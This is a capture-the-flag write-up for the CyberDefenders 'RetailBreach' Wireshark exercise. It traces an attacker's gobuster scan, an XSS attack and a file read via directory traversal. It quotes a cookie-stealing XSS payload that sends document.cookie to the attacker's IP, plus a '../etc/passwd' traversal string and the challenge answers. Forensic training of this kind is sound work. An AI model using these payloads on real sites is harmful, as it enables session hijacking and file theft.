---
title: CyberDefenders - RetailBreach
date: 2026-06-05 00:00:00 +0800
categories:
  - CyberDefenders
  - Network Forensics
tags:
  - WireShark
difficulty: Easy
pin: false
---

---

**Scenario:** In recent days, ShopSphere, a prominent online retail platform, has experienced unusual administrative login activity during late-night hours. These logins coincide with an influx of customer complaints about unexplained account anomalies, raising concerns about a potential security breach. Initial observations suggest unauthorized access to administrative accounts, potentially indicating deeper system compromise.

## Questions

> Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?

![](assets/cyberdef/Pasted%20image%2020260605203727.png)

![](assets/cyberdef/Pasted%20image%2020260605203924.png)

Before diving into the analysis, it is important to understand the hierarchy of the protocol. The majority of the traffic consists of TCP and HTTP protocols. In addition, examine the conversation statistics to gain an overview of which IP addresses involved in high volume of packet communications.

![](assets/cyberdef/Pasted%20image%2020260605204612.png)

![](assets/cyberdef/Pasted%20image%2020260605204736.png)

I noticed that there are high volume of TCP traffic from IP `111.224.180.128` to `73.124.17.52`. Further analysis shown that, `111.224.180.128`is enumerating the web server directory.

>✅ **Answer: 111.224.180.128**

---

> Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?

![](assets/cyberdef/Pasted%20image%2020260605204938.png)

The attacker used gobuster to perform directory brute force.

>✅ **Answer: gobuster**

---

> Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

![](assets/cyberdef/Pasted%20image%2020260605205544.png)

![](assets/cyberdef/Pasted%20image%2020260605205616.png)

To identify XSS, we can filter `POST`request. There are only 2 `POST` request packets. By following the TCP stream, there is a XSS payload. We can decode it in [urldecoder](https://www.urldecoder.org/)

![](assets/cyberdef/Pasted%20image%2020260605205903.png)

This payload is trying to fetch the victim's cookies to it's own IP.

>✅ **Answer: `<script>fetch('http://111.224.180.128/'+ document.cookie);</script>`**

---

> Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

Since the path `/reviews.php`was injected a malicious XSS script, we can filter this path in Wireshark and look for packet that is from our IP to attacker's IP after the injection happened. 

![](assets/cyberdef/Pasted%20image%2020260605211154.png)

>✅ **Answer: 2024-03-29 12:09**

---

> Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?

![](assets/cyberdef/Pasted%20image%2020260605211253.png)

Follow the previous question HTTP packet, and the session token can be identify in Cookie row

>✅ **Answer: lqkctf24s9h9lg67teu8uevn3q**

---

> Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?

![](assets/cyberdef/Pasted%20image%2020260605212043.png)

By analyzing the packets, the script `log_viewer.php`is vulnerable to directory traversal. The script allowed the attacker to read any files on the host by exploiting directory traversal vulnerability.

>✅ **Answer: log_viewer.php**

---

> Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?

Based on the screenshot above, the attacker accessed to `/etc/passwd`file which stores essential user account information. By enumerating this file, the attacker can identify which users have shell access on the host, potentially enable further attacks like brute force

>✅ **Answer: ../../../../../etc/passwd**
